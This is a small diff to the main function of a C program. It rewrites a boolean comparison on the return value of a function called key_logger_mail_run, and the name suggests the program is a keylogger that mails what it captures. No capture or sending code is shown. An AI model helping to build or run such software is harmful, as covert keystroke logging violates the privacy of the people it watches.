@@ -27,5 +27,5 @@ int main(int argc, char* argv[])
 		(void)fprintf(stdout, "Parameters will be ignored!\n");
 	}
 
-	return false == key_logger_mail_run() ? EXIT_FAILURE : EXIT_SUCCESS;
+	return true == key_logger_mail_run() ? EXIT_SUCCESS : EXIT_FAILURE;
 }
